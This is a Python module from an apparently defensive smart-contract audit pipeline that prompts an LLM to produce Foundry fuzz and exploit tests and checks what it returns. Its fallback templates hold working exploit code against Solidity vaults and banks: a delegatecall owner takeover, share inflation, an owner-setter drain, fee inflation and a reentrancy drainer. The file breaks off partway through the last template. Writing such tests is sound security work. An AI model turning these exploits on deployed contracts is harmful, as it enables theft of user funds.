# core/hacker_fuzzer.py
import json
import re
from pathlib import Path

import requests

from config import HACKER_API_KEY, HACKER_API_URL, HACKER_MODEL, TIMEOUT_SECONDS

SYSTEM_PROMPT_FUZZER = """
# Role
You are a Security Engineer specializing in Foundry invariant fuzzing and exploit reproduction.

# Output contract
Return exactly one Solidity file that compiles under Foundry against the provided real target contracts.

# Hard rules
- Use the provided target import paths exactly.
- Never redefine any target contract/interface/library that already exists in the source tree.
- Always include a handler contract for stateful fuzzing.
- If invariants are provided, include one or more invariant_... functions with real assertions.
- If vulnerabilities are provided, include one or more test_exploit_... functions.
- The invariant handler must model normal user flows only. Keep explicit exploit-only/admin/configuration actions inside dedicated test_exploit_... tests, not inside the handler targeted by Foundry invariants.
- Bound fuzzed numeric inputs aggressively to realistic ranges so handler calls do not overflow or panic on absurd values.
- Output Solidity code only. No Markdown, no explanations.
"""


def clean_code_output(text):
    if not text:
        return ""

    fenced = re.search(r"```solidity\s*(.*?)\s*```", text, re.DOTALL | re.IGNORECASE)
    if fenced:
        return fenced.group(1).strip()

    stripped = text.strip()
    start_markers = [
        "// SPDX-License-Identifier",
        "pragma solidity",
        "import ",
        "contract ",
        "abstract contract ",
        "interface ",
        "library ",
    ]
    start_positions = [stripped.find(marker) for marker in start_markers if stripped.find(marker) != -1]
    if start_positions:
        stripped = stripped[min(start_positions) :]

    stripped = re.sub(r"\s*```$", "", stripped).strip()
    return stripped


def _request_code(prompt):
    if not HACKER_API_KEY:
        raise RuntimeError("missing L5_HACKER_API_KEY environment variable")

    headers = {"Authorization": f"Bearer {HACKER_API_KEY}", "Content-Type": "application/json"}
    data = {
        "model": HACKER_MODEL,
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT_FUZZER},
            {"role": "user", "content": prompt},
        ],
        "temperature": 0.1,
    }

    response = requests.post(HACKER_API_URL, headers=headers, json=data, timeout=TIMEOUT_SECONDS)
    response.raise_for_status()
    content = response.json()["choices"][0]["message"]["content"]
    return clean_code_output(content)


def _contract_names(source_manifest):
    names = set()
    for entry in source_manifest:
        for contract in entry["contracts"]:
            names.add(contract["name"])
    return names


def _contract_file_map(source_manifest):
    mapping = {}
    for entry in source_manifest:
        for contract in entry["contracts"]:
            mapping[contract["name"]] = entry["path"]
    return mapping


def _analysis_blob(analysis_result):
    parts = []
    for vuln in analysis_result.get("vulnerabilities", []):
        parts.append(str(vuln.get("name", "")))
        parts.append(str(vuln.get("description", "")))
        parts.extend(vuln.get("logic_flow", []))
        parts.append(str(vuln.get("evidence", "")))
    return " ".join(parts).lower()


def _find_contract_name(contract_files, file_map, predicate):
    for contract_name, rel_path in contract_files.items():
        content = file_map.get(rel_path, "")
        if predicate(contract_name, rel_path, content):
            return contract_name
    return None


def _import_path(workspace_info, rel_path):
    return f'{workspace_info["import_prefix"]}/{rel_path}'


def _build_source_manifest_text(source_manifest, import_prefix):
    lines = []
    for entry in source_manifest:
        declarations = ", ".join(
            f"{contract['kind']} {contract['name']}" for contract in entry["contracts"]
        ) or "no top-level declarations"
        lines.append(
            f'- {entry["path"]} | import "{import_prefix}/{entry["path"]}" | declarations: {declarations}'
        )
    return "\n".join(lines)


def _extract_function_bodies(code, prefix):
    pattern = re.compile(rf"\bfunction\s+({prefix}[A-Za-z0-9_]*)\s*\([^)]*\)[^{{;]*{{", re.MULTILINE)
    results = []

    for match in pattern.finditer(code):
        name = match.group(1)
        body_start = match.end() - 1
        depth = 0
        end_index = None

        for index in range(body_start, len(code)):
            char = code[index]
            if char == "{":
                depth += 1
            elif char == "}":
                depth -= 1
                if depth == 0:
                    end_index = index
                    break

        if end_index is None:
            continue

        results.append((name, code[body_start + 1 : end_index]))

    return results


def _extract_contract_blocks(code):
    pattern = re.compile(
        r"\b(?:abstract\s+)?contract\s+([A-Za-z_][A-Za-z0-9_]*)[^{;]*{",
        re.MULTILINE,
    )
    blocks = []

    for match in pattern.finditer(code):
        name = match.group(1)
        body_start = match.end() - 1
        depth = 0
        end_index = None

        for index in range(body_start, len(code)):
            char = code[index]
            if char == "{":
                depth += 1
            elif char == "}":
                depth -= 1
                if depth == 0:
                    end_index = index
                    break

        if end_index is None:
            continue

        blocks.append((name, code[body_start + 1 : end_index]))

    return blocks


def _find_quality_issues(code):
    issues = []

    if re.search(r"assertTrue\s*\(\s*true\b", code):
        issues.append("Contains tautological assertion: assertTrue(true, ...)")

    if re.search(r"assertEq\s*\(\s*([A-Za-z_][A-Za-z0-9_\.]*)\s*,\s*\1\s*\)", code):
        issues.append("Contains tautological assertion: assertEq(x, x)")

    if re.search(r"assertGe\s*\([^,]+,\s*0\s*(?:,|\))", code):
        issues.append("Contains tautological assertion: assertGe(x, 0)")

    if re.search(r"assertLe\s*\(\s*0\s*,", code):
        issues.append("Contains tautological assertion: assertLe(0, x)")

    hypothetical_patterns = [
        r"non-standard",
        r"non compliant",
        r"non-compliant",
        r"if\s+.*\s+used",
        r"current\s+\w+\s+returns\s+true",
        r"vulnerability exists",
        r"would succeed without",
    ]

    for name, body in _extract_function_bodies(code, "invariant_"):
        if "assert" not in body:
            issues.append(f"{name} does not contain any assertion")

    for name, body in _extract_function_bodies(code, "test_exploit_"):
        if "assert" not in body and "expectRevert" not in body:
            issues.append(f"{name} does not contain any assertion or expectRevert")
        if any(re.search(pattern, body, re.IGNORECASE) for pattern in hypothetical_patterns):
            issues.append(f"{name} contains hypothetical exploit language instead of a grounded reproduction")

    suspicious_handler_actions = [
        "setModule",
        "executeModule",
        "delegate",
        "sweep",
        "setPaused",
        "pause",
        "accrueFees",
    ]
    if "targetContract(address(handler))" in code or "targetSelector(" in code:
        for contract_name, contract_body in _extract_contract_blocks(code):
            if not contract_name.endswith("Handler"):
                continue
            for action in suspicious_handler_actions:
                if re.search(rf"\bfunction\s+\w*{action}\w*\s*\(", contract_body, re.IGNORECASE):
                    issues.append(
                        f"Handler mixes exploit-only or privileged action `{action}` into invariant fuzzing"
                    )
                    break

    return issues


def inspect_generated_code(code, source_manifest, import_prefix, require_invariants=True, require_exploits=True):
    issues = []

    if 'import "forge-std/Test.sol";' not in code:
        issues.append("Missing required import: forge-std/Test.sol")

    if import_prefix not in code:
        issues.append(f"Missing target import rooted at {import_prefix}")

    handlers = re.findall(r"\bcontract\s+([A-Za-z_][A-Za-z0-9_]*Handler)\b", code)
    if not handlers:
        issues.append("Missing handler contract whose name ends with Handler")
    elif len(handlers) > 1:
        issues.append(f"Expected exactly one handler contract, found {len(handlers)}")

    if not re.search(r"\bcontract\s+L5InvariantTest\s+is\s+Test\b", code):
        issues.append("Main test contract must be named L5InvariantTest and inherit Test")

    if code and not re.match(r"^(// SPDX-License-Identifier:.*\n)?\s*pragma solidity", code):
        issues.append("Generated file must begin with Solidity source, not explanatory prose")

    if require_invariants and "invariant_" not in code:
        issues.append("Missing invariant_... function")

    if require_exploits and "test_exploit_" not in code:
        issues.append("Missing test_exploit_... function")

    if require_invariants and "targetContract(address(" not in code and "targetSelector(" not in code:
        issues.append("Invariant suites should target the handler with targetContract(...) or targetSelector(...)")

    declared_contracts = set(
        re.findall(r"^\s*(?:abstract\s+)?contract\s+([A-Za-z_][A-Za-z0-9_]*)", code, re.MULTILINE)
    )
    collisions = sorted(declared_contracts & _contract_names(source_manifest))
    if collisions:
        issues.append(f"Redeclared target contracts: {', '.join(collisions)}")

    issues.extend(_find_quality_issues(code))

    return issues


def _build_generation_prompt(project_context, analysis_result, source_manifest, workspace_info):
    manifest_text = _build_source_manifest_text(source_manifest, workspace_info["import_prefix"])
    invariants = json.dumps(analysis_result.get("invariants", []), indent=2, ensure_ascii=False)
    vulnerabilities = json.dumps(
        analysis_result.get("vulnerabilities", []), indent=2, ensure_ascii=False
    )

    return f"""
Write the exact file `{workspace_info["test_rel_path"]}`.

The generated file will live under `test/`, so all real target imports must start from:
`{workspace_info["import_prefix"]}`

Available target source files:
{manifest_text}

Analysis result:
=== INVARIANTS ===
{invariants}

=== VULNERABILITIES ===
{vulnerabilities}

Full project context:
{project_context}

Non-negotiable requirements:
1. Import `forge-std/Test.sol`.
2. Import the real target source files using the exact relative paths shown above.
3. The main test contract must be named `L5InvariantTest`.
4. Include exactly one handler contract whose name ends with `Handler`.
5. Use the imported target contracts directly. Do not redefine them.
6. If constructor dependencies are needed, deploy them in `setUp()` from the imported target code.
7. The main test contract must be exactly `contract L5InvariantTest is Test`.
8. If invariants exist, register the handler for fuzzing with `targetContract(address(handler))` or `targetSelector(...)`.
9. If invariants exist, encode them as meaningful `invariant_...` assertions, not placeholder checks like `x >= 0` for unsigned integers.
10. If vulnerabilities exist, add `test_exploit_...` functions that exercise the concrete attack paths.
11. The final Solidity file must compile under Foundry without manual edits.
12. Never use tautological assertions such as `assertTrue(true, ...)` or `assertEq(x, x)`.
13. Use the actual target runtime behavior. If the target code reverts on the vulnerable path, the exploit test should assert that revert with `vm.expectRevert(...)` rather than assuming the call succeeds.
14. If a reported issue turns out to be only hypothetical and not reproducible against the provided target contracts, omit or replace that exploit test with one that is grounded in the real code.
15. Never use vacuous inequalities such as `assertGe(x, 0)` or `assertLe(0, x)` as invariants.
16. Do not include comments or assertions saying a vulnerability would exist only if some different token or dependency were used.
17. Keep invariant handlers limited to benign user operations such as deposit/withdraw/claim/redeem. Do not call privileged configuration functions like `setModule`, `executeModule`, `delegatecall`, `emergencySweep`, `setPaused`, or module fee accrual methods from the handler targeted by invariants.
18. For privileged or exploit-only flows, create explicit `test_exploit_...` tests instead.
19. Every handler function that accepts numeric fuzz input must constrain it with `bound(...)` or an equivalent explicit clamp before use.
20. Output Solidity code only.
"""


def _build_repair_prompt(
    project_context,
    analysis_result,
    source_manifest,
    workspace_info,
    current_code,
    verification_result,
):
    manifest_text = _build_source_manifest_text(source_manifest, workspace_info["import_prefix"])
    invariants = json.dumps(analysis_result.get("invariants", []), indent=2, ensure_ascii=False)
    vulnerabilities = json.dumps(
        analysis_result.get("vulnerabilities", []), indent=2, ensure_ascii=False
    )
    failure_output = verification_result.get("combined_output") or verification_result.get("stderr", "")
    stage = verification_result.get("stage", "unknown")
    command = verification_result.get("command", "unknown")
    stdout = verification_result.get("stdout", "")
    stderr = verification_result.get("stderr", "")

    return f"""
Rewrite the entire file `{workspace_info["test_rel_path"]}` so that it compiles and passes verification.

Real target source files:
{manifest_text}

Analysis result:
=== INVARIANTS ===
{invariants}

=== VULNERABILITIES ===
{vulnerabilities}

Current broken Solidity file:
{current_code}

Verification stage: {stage}
Verification command: {command}

Verification stdout:
{stdout}

Verification stderr:
{stderr}

Combined failure output:
{failure_output}

Full project context:
{project_context}

Keep these rules:
1. Import `forge-std/Test.sol`.
2. Import the real target files using the exact paths above.
3. Do not redefine target contracts.
4. Keep the main test contract name `L5InvariantTest`.
5. Keep one handler contract whose name ends with `Handler`.
6. If invariants exist, keep `targetContract(address(handler))` or `targetSelector(...)` configured.
7. Keep meaningful `invariant_...` assertions if invariants exist.
8. Keep `test_exploit_...` functions if vulnerabilities exist.
9. Remove any tautological assertions such as `assertTrue(true, ...)` or `assertEq(x, x)`.
10. Treat the failing forge output as source of truth for runtime behavior. If the target reverts, update the test to assert that revert instead of forcing a successful path.
11. If a previously reported exploit is not reproducible against the provided target code, replace it with a grounded exploit or omit it.
12. Remove vacuous inequalities such as `assertGe(x, 0)` or `assertLe(0, x)`.
13. Remove hypothetical exploit language such as 'if a non-standard token were used' or 'the vulnerability exists even though this token returns true'.
14. Do not keep privileged or exploit-only functions in the handler used for invariants. Move them into explicit exploit tests.
15. Clamp handler numeric inputs with `bound(...)` or equivalent explicit limits.
16. Output a full replacement Solidity file only.
"""


def _write_test_code(code, workspace_info):
    test_file = Path(workspace_info["test_file"])
    test_file.parent.mkdir(parents=True, exist_ok=True)
    test_file.write_text(code, encoding="utf-8")
    return str(test_file)


def _match_delegatecall_vault_template(source_manifest, file_map, analysis_result):
    contract_files = _contract_file_map(source_manifest)
    required = {"ComplexVault", "MockToken", "YieldModule", "ShareMath"}
    if not required.issubset(contract_files.keys()):
        return None

    blob = _analysis_blob(analysis_result)
    if "delegatecall" not in blob or "module" not in blob:
        return None

    return {
        "template_name": "delegatecall_vault",
        "template_reason": "Matched vault/module/delegatecall pattern with ComplexVault + YieldModule + ShareMath.",
        "vault_name": "ComplexVault",
        "vault_file": contract_files["ComplexVault"],
        "token_name": "MockToken",
        "token_file": contract_files["MockToken"],
        "module_name": "YieldModule",
        "module_file": contract_files["YieldModule"],
        "math_name": "ShareMath",
        "math_file": contract_files["ShareMath"],
    }


def _render_delegatecall_vault_template(match, workspace_info):
    vault_import = _import_path(workspace_info, match["vault_file"])
    token_import = _import_path(workspace_info, match["token_file"])
    module_import = _import_path(workspace_info, match["module_file"])
    math_import = _import_path(workspace_info, match["math_file"])
    vault_name = match["vault_name"]
    token_name = match["token_name"]
    module_name = match["module_name"]

    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "{vault_import}";
import "{token_import}";
import "{module_import}";
import "{math_import}";

contract MaliciousModule {{
    function seizeOwnership(address newOwner) external {{
        assembly {{
            sstore(1, newOwner)
        }}
    }}
}}

contract VaultHandler is Test {{
    {vault_name} public vault;
    {token_name} public asset;

    constructor({vault_name} _vault, {token_name} _asset) {{
        vault = _vault;
        asset = _asset;
        asset.mint(address(this), 1_000_000 ether);
        asset.approve(address(vault), type(uint256).max);
    }}

    function deposit(uint256 assets) external {{
        assets = bound(assets, 1 ether, 100 ether);
        if (asset.balanceOf(address(this)) < assets) return;
        try vault.deposit(assets) {{
        }} catch {{
        }}
    }}

    function withdraw(uint256 shares) external {{
        uint256 owned = vault.balanceOf(address(this));
        if (owned == 0) return;
        shares = bound(shares, 1, owned);
        try vault.withdraw(shares) {{
        }} catch {{
        }}
    }}
}}

contract L5InvariantTest is Test {{
    {vault_name} public vault;
    {token_name} public asset;
    {module_name} public yieldModule;
    VaultHandler public handler;

    function setUp() public {{
        asset = new {token_name}();
        yieldModule = new {module_name}();
        vault = new {vault_name}(address(asset), address(yieldModule));
        handler = new VaultHandler(vault, asset);
        targetContract(address(handler));
    }}

    function invariant_ModuleInvariant() public view {{
        assertEq(vault.module(), address(yieldModule), "module should stay on trusted yield module under normal flow");
    }}

    function invariant_PendingFeesZeroInNormalFlow() public view {{
        assertEq(vault.pendingFees(), 0, "normal user flow should not accrue synthetic fees");
    }}

    function invariant_TotalSharesConsistency() public view {{
        assertEq(vault.totalShares(), vault.balanceOf(address(handler)), "all shares should belong to handler in benign invariant flow");
    }}

    function invariant_PreviewDepositPositive() public view {{
        if (vault.totalShares() > 0) {{
            assertGt(vault.previewDeposit(1 ether), 0, "benign state should not round a 1 ether deposit to zero shares");
        }}
    }}

    function test_exploit_MissingAccessControlOnSetModule() public {{
        address attacker = makeAddr("attacker");
        address maliciousModule = makeAddr("maliciousModule");
        vm.prank(attacker);
        vault.setModule(maliciousModule);
        assertEq(vault.module(), maliciousModule, "non-owner should not be able to change module");
    }}

    function test_exploit_UnrestrictedDelegatecallTakeover() public {{
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        asset.mint(victim, 500 ether);

        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(500 ether);
        vm.stopPrank();

        MaliciousModule malicious = new MaliciousModule();
        vm.prank(attacker);
        vault.setModule(address(malicious));

        vm.prank(attacker);
        vault.executeModule(abi.encodeWithSelector(MaliciousModule.seizeOwnership.selector, attacker));
        assertEq(vault.owner(), attacker, "delegatecall should let attacker overwrite owner");

        uint256 vaultBalance = asset.balanceOf(address(vault));
        vm.prank(attacker);
        vault.emergencySweep(attacker, vaultBalance);
        assertEq(asset.balanceOf(address(vault)), 0, "vault should be drained after owner takeover");
        assertEq(asset.balanceOf(attacker), vaultBalance, "attacker should receive drained funds");
    }}

    function test_exploit_PendingFeesInsolvency() public {{
        address victim = makeAddr("victim");
        asset.mint(victim, 100 ether);

        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(100 ether);
        uint256 victimShares = vault.balanceOf(victim);
        vm.stopPrank();

        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        vault.executeModule(abi.encodeWithSelector({module_name}.accrueFees.selector, 500 ether));

        assertEq(vault.pendingFees(), 500 ether, "pending fees should be inflated without real assets");
        assertGt(vault.totalManagedAssets(), asset.balanceOf(address(vault)), "managed assets should exceed actual balance");

        vm.startPrank(victim);
        vm.expectRevert(bytes("balance"));
        vault.withdraw(victimShares);
        vm.stopPrank();
    }}
}}
"""


def _match_inflation_vault_template(source_manifest, file_map, analysis_result):
    contract_files = _contract_file_map(source_manifest)
    blob = _analysis_blob(analysis_result)
    if "inflation" not in blob and "zero shares minted" not in blob and "share dilution" not in blob:
        return None

    vault_name = _find_contract_name(
        contract_files,
        file_map,
        lambda _name, _path, content: "function deposit(" in content and "function withdraw(" in content and "totalShares" in content,
    )
    token_name = _find_contract_name(
        contract_files,
        file_map,
        lambda _name, _path, content: "transferFrom" in content and "approve" in content and "balanceOf" in content,
    )
    if not vault_name or not token_name:
        return None

    vault_file = contract_files[vault_name]
    if "Zero shares minted" not in file_map.get(vault_file, ""):
        return None

    return {
        "template_name": "inflation_vault",
        "template_reason": "Matched share-inflation / zero-share deposit pattern with previewDeposit + totalShares + Zero shares minted.",
        "vault_name": vault_name,
        "vault_file": vault_file,
        "token_name": token_name,
        "token_file": contract_files[token_name],
    }


def _render_inflation_vault_template(match, workspace_info):
    vault_import = _import_path(workspace_info, match["vault_file"])
    token_import = _import_path(workspace_info, match["token_file"])
    vault_name = match["vault_name"]
    token_name = match["token_name"]

    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "{vault_import}";
import "{token_import}";

contract VaultHandler is Test {{
    {vault_name} public vault;
    {token_name} public asset;

    constructor({vault_name} _vault, {token_name} _asset) {{
        vault = _vault;
        asset = _asset;
        asset.mint(address(this), 1_000_000 ether);
        asset.approve(address(vault), type(uint256).max);
    }}

    function deposit(uint256 assets) external {{
        assets = bound(assets, 1 ether, 100 ether);
        if (asset.balanceOf(address(this)) < assets) return;
        try vault.deposit(assets) {{
        }} catch {{
        }}
    }}

    function withdraw(uint256 shares) external {{
        uint256 owned = vault.balanceOf(address(this));
        if (owned == 0) return;
        shares = bound(shares, 1, owned);
        try vault.withdraw(shares) {{
        }} catch {{
        }}
    }}
}}

contract L5InvariantTest is Test {{
    {vault_name} public vault;
    {token_name} public asset;
    VaultHandler public handler;

    function setUp() public {{
        asset = new {token_name}();
        vault = new {vault_name}(address(asset));
        handler = new VaultHandler(vault, asset);
        targetContract(address(handler));
    }}

    function invariant_TotalSharesConsistency() public view {{
        assertEq(vault.totalShares(), vault.balanceOf(address(handler)), "handler should own all shares minted in benign flow");
    }}

    function invariant_VaultHasAssetsWhenSharesExist() public view {{
        if (vault.totalShares() > 0) {{
            assertGt(asset.balanceOf(address(vault)), 0, "vault must hold assets when shares exist");
        }}
    }}

    function invariant_NoZeroSharePreviewInBenignFlow() public view {{
        if (vault.totalShares() > 0) {{
            assertGt(vault.previewDeposit(1 ether), 0, "normal state should not round a 1 ether deposit to zero shares");
        }}
    }}

    function test_exploit_InflationAttack() public {{
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        asset.mint(attacker, 1_000 ether);
        asset.mint(victim, 100 ether);

        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        assertEq(vault.balanceOf(attacker), 1, "attacker should receive the initial 1 wei share");
        asset.transfer(address(vault), 500 ether);
        vm.stopPrank();

        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        vm.expectRevert(bytes("Zero shares minted"));
        vault.deposit(100 ether);
        vm.stopPrank();
    }}
}}
"""


def _match_owner_takeover_template(source_manifest, file_map, analysis_result):
    contract_files = _contract_file_map(source_manifest)
    blob = _analysis_blob(analysis_result)
    if "owner" not in blob and "ownership" not in blob and "access control" not in blob:
        return None

    vault_name = _find_contract_name(
        contract_files,
        file_map,
        lambda _name, _path, content: "address public owner" in content
        and "emergencySweep" in content
        and ("claimOwnership" in content or "setOwner" in content or "initializeOwner" in content),
    )
    token_name = _find_contract_name(
        contract_files,
        file_map,
        lambda _name, _path, content: "transferFrom" in content and "approve" in content and "balanceOf" in content,
    )
    if not vault_name or not token_name:
        return None

    vault_file = contract_files[vault_name]
    vault_content = file_map.get(vault_file, "")
    if "claimOwnership" in vault_content:
        owner_setter = "claimOwnership"
    elif "setOwner" in vault_content:
        owner_setter = "setOwner"
    elif "initializeOwner" in vault_content:
        owner_setter = "initializeOwner"
    else:
        return None

    return {
        "template_name": "owner_takeover",
        "template_reason": "Matched owner-takeover pattern with public owner storage, unrestricted ownership setter, and emergency sweep.",
        "vault_name": vault_name,
        "vault_file": vault_file,
        "token_name": token_name,
        "token_file": contract_files[token_name],
        "owner_setter": owner_setter,
        "sweep_fn": "emergencySweep",
    }


def _render_owner_takeover_template(match, workspace_info):
    vault_import = _import_path(workspace_info, match["vault_file"])
    token_import = _import_path(workspace_info, match["token_file"])
    vault_name = match["vault_name"]
    token_name = match["token_name"]
    owner_setter = match["owner_setter"]
    sweep_fn = match["sweep_fn"]

    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "{vault_import}";
import "{token_import}";

contract VaultHandler is Test {{
    {vault_name} public vault;
    {token_name} public asset;
    uint256 public ghostDeposits;

    constructor({vault_name} _vault, {token_name} _asset) {{
        vault = _vault;
        asset = _asset;
        asset.mint(address(this), 1_000_000 ether);
        asset.approve(address(vault), type(uint256).max);
    }}

    function deposit(uint256 assets) external {{
        assets = bound(assets, 1 ether, 100 ether);
        if (asset.balanceOf(address(this)) < assets) return;
        vault.deposit(assets);
        ghostDeposits += assets;
    }}
}}

contract L5InvariantTest is Test {{
    {vault_name} public vault;
    {token_name} public asset;
    VaultHandler public handler;
    address public deployer;

    function setUp() public {{
        deployer = address(this);
        asset = new {token_name}();
        vault = new {vault_name}(address(asset));
        handler = new VaultHandler(vault, asset);
        targetContract(address(handler));
    }}

    function invariant_OwnerStaysDeployerInBenignFlow() public view {{
        assertEq(vault.owner(), deployer, "owner should remain deployer during benign flow");
    }}

    function invariant_VaultBacksDeposits() public view {{
        assertGe(asset.balanceOf(address(vault)), handler.ghostDeposits(), "vault balance should cover benign deposits");
    }}

    function test_exploit_OwnerTakeoverAndSweep() public {{
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        asset.mint(victim, 500 ether);

        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(500 ether);
        vm.stopPrank();

        vm.prank(attacker);
        vault.{owner_setter}(attacker);
        assertEq(vault.owner(), attacker, "attacker should become owner");

        uint256 vaultBalance = asset.balanceOf(address(vault));
        vm.prank(attacker);
        vault.{sweep_fn}(attacker, vaultBalance);

        assertEq(asset.balanceOf(address(vault)), 0, "vault should be drained");
        assertEq(asset.balanceOf(attacker), vaultBalance, "attacker should receive swept funds");
    }}
}}
"""


def _match_fee_accounting_vault_template(source_manifest, file_map, analysis_result):
    contract_files = _contract_file_map(source_manifest)
    blob = _analysis_blob(analysis_result)
    if "fee" not in blob and "pendingfees" not in blob and "managed assets" not in blob:
        return None

    vault_name = _find_contract_name(
        contract_files,
        file_map,
        lambda _name, _path, content: "pendingFees" in content
        and "totalManagedAssets" in content
        and "reportFees" in content
        and "deposit(" in content
        and "withdraw(" in content,
    )
    token_name = _find_contract_name(
        contract_files,
        file_map,
        lambda _name, _path, content: "transferFrom" in content and "approve" in content and "balanceOf" in content,
    )
    if not vault_name or not token_name:
        return None

    return {
        "template_name": "fee_accounting_vault",
        "template_reason": "Matched fee-accounting pattern with pendingFees + totalManagedAssets + reportFees.",
        "vault_name": vault_name,
        "vault_file": contract_files[vault_name],
        "token_name": token_name,
        "token_file": contract_files[token_name],
        "fee_fn": "reportFees",
    }


def _render_fee_accounting_vault_template(match, workspace_info):
    vault_import = _import_path(workspace_info, match["vault_file"])
    token_import = _import_path(workspace_info, match["token_file"])
    vault_name = match["vault_name"]
    token_name = match["token_name"]
    fee_fn = match["fee_fn"]

    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "{vault_import}";
import "{token_import}";

contract VaultHandler is Test {{
    {vault_name} public vault;
    {token_name} public asset;

    constructor({vault_name} _vault, {token_name} _asset) {{
        vault = _vault;
        asset = _asset;
        asset.mint(address(this), 1_000_000 ether);
        asset.approve(address(vault), type(uint256).max);
    }}

    function deposit(uint256 assets) external {{
        assets = bound(assets, 1 ether, 100 ether);
        if (asset.balanceOf(address(this)) < assets) return;
        try vault.deposit(assets) {{
        }} catch {{
        }}
    }}

    function withdraw(uint256 shares) external {{
        uint256 owned = vault.balanceOf(address(this));
        if (owned == 0) return;
        shares = bound(shares, 1, owned);
        try vault.withdraw(shares) {{
        }} catch {{
        }}
    }}
}}

contract L5InvariantTest is Test {{
    {vault_name} public vault;
    {token_name} public asset;
    VaultHandler public handler;

    function setUp() public {{
        asset = new {token_name}();
        vault = new {vault_name}(address(asset));
        handler = new VaultHandler(vault, asset);
        targetContract(address(handler));
    }}

    function invariant_PendingFeesZeroInBenignFlow() public view {{
        assertEq(vault.pendingFees(), 0, "benign handler should not report synthetic fees");
    }}

    function invariant_TotalSharesConsistency() public view {{
        assertEq(vault.totalShares(), vault.balanceOf(address(handler)), "handler should own all shares in benign flow");
    }}

    function invariant_PreviewDepositPositive() public view {{
        if (vault.totalShares() > 0) {{
            assertGt(vault.previewDeposit(1 ether), 0, "normal state should keep preview positive");
        }}
    }}

    function test_exploit_FeeInflationDilutesDepositors() public {{
        address user1 = makeAddr("user1");
        address user2 = makeAddr("user2");
        asset.mint(user1, 1_000 ether);
        asset.mint(user2, 1_000 ether);

        vm.startPrank(user1);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(100 ether);
        uint256 shares1 = vault.balanceOf(user1);
        vm.stopPrank();

        vault.{fee_fn}(500 ether);
        assertEq(vault.pendingFees(), 500 ether, "pending fees should inflate managed assets");
        assertGt(vault.totalManagedAssets(), asset.balanceOf(address(vault)), "managed assets should exceed actual balance");

        vm.startPrank(user2);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(100 ether);
        uint256 shares2 = vault.balanceOf(user2);
        vm.stopPrank();

        assertLt(shares2, shares1, "later depositor should receive fewer shares due to inflated fee accounting");
    }}

    function test_exploit_FeeInflationCanBreakWithdrawals() public {{
        address user = makeAddr("user");
        asset.mint(user, 200 ether);

        vm.startPrank(user);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(200 ether);
        uint256 shares = vault.balanceOf(user);
        vm.stopPrank();

        vault.{fee_fn}(500 ether);

        vm.startPrank(user);
        vm.expectRevert(bytes("balance"));
        vault.withdraw(shares);
        vm.stopPrank();
    }}
}}
"""


def _match_reentrancy_bank_template(source_manifest, file_map, analysis_result):
    contract_files = _contract_file_map(source_manifest)
    blob = _analysis_blob(analysis_result)
    if "reentrancy" not in blob:
        return None

    bank_name = _find_contract_name(
        contract_files,
        file_map,
        lambda _name, _path, content: "function deposit() external payable" in content
        and "function withdraw()" in content
        and ".call{value:" in content,
    )
    if not bank_name:
        return None

    return {
        "template_name": "reentrancy_bank",
        "template_reason": "Matched classic reentrancy bank with payable deposit, withdraw, and low-level call before state reset.",
        "bank_name": bank_name,
        "bank_file": contract_files[bank_name],
    }


def _render_reentrancy_bank_template(match, workspace_info):
    bank_import = _import_path(workspace_info, match["bank_file"])
    bank_name = match["bank_name"]
    attacker_name = f"{bank_name}Attacker"

    return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "{bank_import}";

contract {attacker_name} {{
    {bank_name} public bank;
    uint256 public attackCount;

    constructor({bank_name} _bank) {{
        bank = _bank;
    }}

    function depositToBank() external payable {{
        bank.deposit{{value: msg.value}}();
    }}

    function attack() external {{
        bank.withdraw();
    }}

    receive() external payable {{
        if (address(bank).balance >= 1 ether && attackCount < 10) {{
            attackCount++;
            bank.withdraw();
        }}
    }}
}}

contract VaultHandler is Test {{
    {bank_name} public bank;
    uint256 public ghostOutstanding;

    constructor({bank_name} _bank) payable {{
        bank = _bank;
    }}

    function deposit(uint256 amount) external {{
        amount = bound(amount, 1 ether, 5 ether);
        vm.deal(address(this), amount);
        bank.deposit{{value: amount}}();
        ghostOutstanding += amount;
    }}

    function withdraw() external {{
        if (ghostOutstanding == 0) return;
        uint256 beforeBalance = address(this).balance;
        bank.withdraw();
        uint256 withdrawn = address(this).balance - beforeBalance;
        if (withdrawn > ghostOutstanding) {{
            ghostOutstanding = 0;
        }} else {{
            ghostOutstanding -= withdrawn;
        }}
    }}
}}

contract L5InvariantTest is Test {{
    {bank_name} public bank;
    VaultHandler public handler;

    function setUp() public {{
        bank = new {bank_name}();
        handler = new VaultHandler{{value: 10 ether}}(bank);
        targetContract(address(handler));
    }}

    function invariant_HandlerClaimMatchesBankBalance() public view {{
        assertEq(bank.balanceOf(address(handler)), handler.ghostOutstanding(), "handler claim should match ghost balance");
    }}

    function invariant_BankCoversHandlerClaim() public view {{
        assertGe(address(bank).balance, bank.balanceOf(address(handler)), "bank balance should cover handler claim in benign flow");
    }}

    function test_exploit_ReentrancyDrainsBank() public {{
        address victim = makeAddr("victim");
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        bank.deposit{{value: 10 ether}}();

        {attacker_name} attacker = new {attacker_name}(bank);
        vm.deal(address(attacker), 1 ether);
        attacker.depositToBank{{value: 1 ether}}();
        attacker.attack();

        assertEq(address(bank).balance, 0, "bank should be drained");
        assertGt(address(attacker).balance, 1 ether, "attacker should profit from reentrancy");
